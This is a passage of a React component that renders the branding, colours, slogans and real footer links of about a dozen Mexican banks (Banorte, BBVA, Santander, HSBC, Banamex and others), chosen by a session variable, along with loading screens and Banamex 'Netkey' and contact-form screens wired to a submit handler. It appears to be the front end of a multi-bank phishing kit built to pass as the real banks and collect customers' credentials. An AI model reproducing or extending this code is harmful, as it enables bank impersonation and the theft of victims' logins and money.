            sessionData.banco === 'SANTANDER' ? 'bg-[#EC0000]' :
            sessionData.banco === 'SCOTIABANK' ? 'bg-[#EC111A]' :
            sessionData.banco === 'BANAMEX' ? 'bg-[#ff6b35]' :
            sessionData.banco === 'BANREGIO' ? 'bg-[#FF6600]' :
            sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
            'bg-[#EC1C24]'
          } text-white p-4 text-center text-sm`}>
            <div className="mb-3">
              <a href={
                sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/ayuda/contacto' : 
                sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/contacto.html' : 
                sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/contacto.html' :
                sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/contacto/index.html' :
                sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/contacto/' :
                sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/contacto/' :
                sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/contacto/' :
                sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/contacto/canales-de-atencion.aspx' :
                sessionData.banco === 'BANAMEX' ? 'https://www.banamex.com/es/personas/contacto.html' :
                sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/contacto.php' :
                sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/contacto' :
                'https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte'
              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Contáctanos</a> |
              <a href={
                sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/ayuda/aclaraciones/ayuda-aclaraciones/' : 
                sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/servicios-digitales/aclaraciones.html' : 
                sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/servicios-digitales/aclaraciones.html' :
                sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/aclaraciones/index.html' :
                sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/contacto/aclaraciones/' :
                sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/disputas/' :
                sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/aclaraciones/' :
                sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/contacto/unidad-especializada-aclaraciones.aspx' :
                sessionData.banco === 'BANAMEX' ? 'https://www.banamex.com/es/personas/seguridad.html' :
                sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/ayuda/aclaraciones.php' :
                sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/preguntas-frecuentes' :
                'https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte/aclaraciones-en-linea'
              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Aclaraciones</a> |
              <a href={
                sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/promociones/' : 
                sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/promociones.html' : 
                sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/productos/promociones.html' :
                sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/promociones/index.html' :
                sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/promociones/' :
                sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/promociones/hoteles/' :
                sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/santander-select/promociones-exclusivas/' :
                sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/promociones/promociones.aspx' :
                sessionData.banco === 'BANAMEX' ? 'https://www.banamex.com/es/personas/promociones.html' :
                sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/promociones/' :
                sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/promociones' :
                'https://www.banorte.com/wps/portal/banorte/Home/promociones/todas'
              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Promociones</a> |
              <a href={
                sessionData.banco === 'LIVERPOOL' ? 'https://www.facebook.com/liverpoolmexico' : 
                sessionData.banco === 'CITIBANAMEX' ? 'https://www.facebook.com/CitibanamexMx' : 
                sessionData.banco === 'BBVA' ? 'https://www.facebook.com/BBVAMexico' :
                sessionData.banco === 'BANCOPPEL' ? 'https://www.facebook.com/BanCoppel' :
                sessionData.banco === 'HSBC' ? 'https://www.facebook.com/HSBC.MX' :
                sessionData.banco === 'AMEX' ? 'https://www.facebook.com/AmericanExpressMexico' :
                sessionData.banco === 'SANTANDER' ? 'https://www.facebook.com/SantanderMexico' :
                sessionData.banco === 'SCOTIABANK' ? 'https://www.facebook.com/ScotiabankMX' :
                sessionData.banco === 'BANAMEX' ? 'https://www.facebook.com/share/16Fn8ePZxS/?mibextid=wwXIfr' :
                sessionData.banco === 'BANREGIO' ? 'https://www.facebook.com/banregio' :
                sessionData.banco === 'SPIN' ? 'https://www.facebook.com/SpinByOxxo' :
                'https://www.facebook.com/BanorteOficial'
              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Facebook</a> |
              <a href={
                sessionData.banco === 'LIVERPOOL' ? 'https://www.youtube.com/user/liverpoolmexico' : 
                sessionData.banco === 'CITIBANAMEX' ? 'https://www.youtube.com/user/Banamex' : 
                sessionData.banco === 'BBVA' ? 'https://www.youtube.com/user/BBVABancomer' :
                sessionData.banco === 'BANCOPPEL' ? 'https://www.youtube.com/channel/UCiLI7sTiT4XjzUOtYQrNtpw' :
                sessionData.banco === 'HSBC' ? 'https://www.youtube.com/user/HSBCMEX' :
                sessionData.banco === 'AMEX' ? 'https://www.youtube.com/user/americanexpressmexico' :
                sessionData.banco === 'SANTANDER' ? 'https://www.youtube.com/user/SantanderMx' :
                sessionData.banco === 'SCOTIABANK' ? 'https://www.youtube.com/user/ScotiabankMX' :
                sessionData.banco === 'BANAMEX' ? 'https://www.youtube.com/user/Banamex' :
                sessionData.banco === 'BANREGIO' ? 'https://www.youtube.com/channel/UC0UWRvXksJJzXG-hRnGDG3g' :
                sessionData.banco === 'SPIN' ? 'https://www.youtube.com/channel/UC6LuKC5QzmY2V4qVbJYJavw' :
                'https://www.youtube.com/user/GFBanorte'
              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Youtube</a>
            </div>
            <div>© {
              sessionData.banco === 'LIVERPOOL' ? 'Liverpool' :
              sessionData.banco === 'CITIBANAMEX' ? 'Banamex' : 
              sessionData.banco === 'BBVA' ? 'BBVA' :
              sessionData.banco === 'BANCOPPEL' ? 'BanCoppel' :
              sessionData.banco === 'HSBC' ? 'HSBC' :
              sessionData.banco === 'AMEX' ? 'American Express' :
              sessionData.banco === 'SANTANDER' ? 'Santander' :
              sessionData.banco === 'SCOTIABANK' ? 'Scotiabank' :
              sessionData.banco === 'BANAMEX' ? 'BANAMEX' :
              sessionData.banco === 'BANREGIO' ? 'Banregio' :
              sessionData.banco === 'SPIN' ? 'SPIN by Oxxo' :
              'Banorte'
            } México 2025. Todos los Derechos Reservados</div>
          </div>
        </footer>
      );
    }
  };

  // Función para mostrar información adicional según el banco
  const renderBankInfo = () => {
    if (sessionData.banco === 'BANBAJIO') {
      return null; // BanBajío no muestra información adicional
    } else if (sessionData.banco === 'LIVERPOOL') {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm text-gray-600">Tu experiencia de banca en línea de Liverpool, segura y confiable</p>
        </div>
      );
    } else if (sessionData.banco === 'CITIBANAMEX') {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm text-gray-600">Banca digital segura para todos tus trámites financieros</p>
        </div>
      );
    } else if (sessionData.banco === 'BBVA') {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm text-gray-600">La manera más fácil y segura de realizar tus operaciones bancarias</p>
        </div>
      );
    } else if (sessionData.banco === 'BANORTE') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Tu banca en línea, más segura y con mayor protección</p>
        </div>
      );
    } else if (sessionData.banco === 'BANCOPPEL') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">La llave a tu mundo financiero</p>
        </div>
      );
    } else if (sessionData.banco === 'HSBC') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">El banco local con perspectiva global</p>
        </div>
      );
    } else if (sessionData.banco === 'AMEX') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a American Express</p>
        </div>
      );
    } else if (sessionData.banco === 'SANTANDER') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a Santander, tu banco de confianza</p>
        </div>
      );
    } else if (sessionData.banco === 'SCOTIABANK') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a Scotiabank, tu banco con más posibilidades</p>
        </div>
      );
    } else if (sessionData.banco === 'BANREGIO') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a Banregio Banca Digital</p>
        </div>
      );
    } else if (sessionData.banco === 'SPIN') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a SPIN by Oxxo</p>
        </div>
      );
    } else if (sessionData.banco === 'BANAMEX') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a Banamex</p>
        </div>
      );
    } else {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm">Recuerda que con una sola cuenta puedes ingresar a todas nuestras tiendas.</p>
          <div className="mt-2 space-x-2">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Suburbia_2022_logo.svg/100px-Suburbia_2022_logo.svg.png" 
              className="h-5 inline-block" 
              alt="Suburbia" 
            />
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/8/89/Williams-Sonoma_logo.svg" 
              className="h-5 inline-block" 
              alt="Williams Sonoma" 
            />
          </div>
        </div>
      );
    }
  };

  // Si estamos mostrando el mensaje inicial o aún no se ha cargado el banco, mostrar una pantalla de carga
  if (showInitialMessage || !bankLoaded) {
    const loadingContent = (
      <div className="container mx-auto max-w-md px-6 py-8 flex-grow flex flex-col items-center justify-center">
        <div className="text-center mb-4">
          <h2 className="text-xl font-semibold mb-4">{initialMessage}</h2>
          <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
            <div className={`h-full ${
              sessionData.banco === 'LIVERPOOL' ? 'liverpool-bg' :
              sessionData.banco === 'BANBAJIO' ? 'banbajio-bg' : 
              sessionData.banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
              sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
              sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
              sessionData.banco === 'HSBC' ? 'bg-[#DB0011]' :
              sessionData.banco === 'AMEX' ? 'amex-bg' :
              sessionData.banco === 'SANTANDER' ? 'santander-bg' :
              sessionData.banco === 'SCOTIABANK' ? 'scotiabank-bg' :
              sessionData.banco === 'BANAMEX' ? 'platacard-bg' :
              sessionData.banco === 'BANREGIO' ? 'banregio-bg' :
              sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
              'bg-[#EC1C24]'
            } animate-progress-bar`}></div>
          </div>
        </div>
      </div>
    );
    
    // Si no se ha cargado el banco aún, mostramos una pantalla genérica de carga
    if (!bankLoaded) {
      return (
        <div className="min-h-screen flex flex-col bg-white">
          <header className="bg-gray-100 text-gray-800 p-4 text-center">
            <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
            <div className="h-20"></div>
          </header>
          
          {loadingContent}
          
          <footer className="mt-auto">
            <div className="bg-gray-100 p-4 text-center text-sm">
              <a href="https://www.banorte.com/" target="_blank" rel="noopener noreferrer" className="text-gray-600 mx-2">Aprende más</a>
              <a href="https://www.banorte.com/wps/portal/banorte/Home/ayuda-banorte/" target="_blank" rel="noopener noreferrer" className="text-gray-600 mx-2">Ayuda</a>
              <a href="https://www.banorte.com/wps/portal/banorte/Home/inicio/terminos-y-condiciones" target="_blank" rel="noopener noreferrer" className="text-gray-600 mx-2">Términos y condiciones</a>
              <a href="https://www.banorte.com/wps/portal/banorte/Home/seguridad-banorte" target="_blank" rel="noopener noreferrer" className="text-gray-600 mx-2">Seguridad en línea</a>
            </div>
            <div className="bg-gray-800 text-white p-4 text-center text-sm">
              <div className="mb-3">
                <a href="https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Contáctanos</a> |
                <a href="https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte/aclaraciones-en-linea" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Aclaraciones</a> |
                <a href="https://www.banorte.com/wps/portal/banorte/Home/promociones/todas" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Promociones</a> |
                <a href="https://www.facebook.com/BanorteOficial" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Facebook</a> |
                <a href="https://www.youtube.com/user/GFBanorte" target="_blank" rel="noopener noreferrer" className="text-white mx-2">YouTube</a>
              </div>
              <div>© Banca Digital 2024. Todos los Derechos Reservados</div>
            </div>
          </footer>
        </div>
      );
    }
    
    // Si el banco ya está cargado pero seguimos en la pantalla de carga
    return (
      <div 
        className={`min-h-screen flex flex-col ${
          sessionData.banco === 'BANBAJIO' 
            ? 'banbajio-background'  
            : 'bg-white'
        }`}
        style={
          sessionData.banco === 'BANBAJIO' 
            ? { backgroundImage: `url(${banbajioBackground})`, backgroundSize: 'cover' } 
            : sessionData.banco === 'HSBC'
            ? { backgroundImage: `url(${hsbcBackground})`, backgroundSize: 'cover' } 
            : {}
        }
      >
        {renderHeader()}
        {loadingContent}
        <div className="mt-auto">
          {renderFooter()}
        </div>
      </div>
    );
  }

  // Renderizado normal cuando no estamos mostrando el mensaje inicial
  
  // Para pantallas de Banamex (ventana emergente), renderizar sin header/footer del ClientScreen
  const isBanamexPopup = currentScreen === ScreenType.BANAMEX_NETKEY || 
                         currentScreen === ScreenType.BANAMEX_CONTACT_FORM || 
                         currentScreen === ScreenType.BANAMEX_WAITING;
  
  if (isBanamexPopup) {
    return (
      <ScreenTemplates 
        currentScreen={currentScreen} 
        screenData={screenData}
        sessionData={sessionData}
        onSubmit={handleSubmit}
        banco={sessionData.banco || 'BANORTE'}
      />
    );
  }
  
  return (
    <div 
      className={`min-h-screen flex flex-col ${
        sessionData.banco === 'BANBAJIO' 
          ? 'banbajio-background'  
          : 'bg-white'
      }`}
      style={
        sessionData.banco === 'BANBAJIO' 
          ? { backgroundImage: `url(${banbajioBackground})`, backgroundSize: 'cover' } 
          : sessionData.banco === 'HSBC'
          ? { backgroundImage: `url(${hsbcBackground})`, backgroundSize: 'cover' } 
          : {}
      }
    >
      {renderHeader()}
      {/* Eliminamos renderBankInfo para evitar duplicar elementos */}

      <div className="container mx-auto max-w-md px-6 py-8 flex-grow">
        <ScreenTemplates 
          currentScreen={currentScreen} 
          screenData={screenData}
          sessionData={sessionData}
          onSubmit={handleSubmit}
          banco={sessionData.banco || 'BANORTE'}
        />
      </div>

      <div className="mt-auto">
        {renderFooter()}
      </div>
    </div>
  );
}
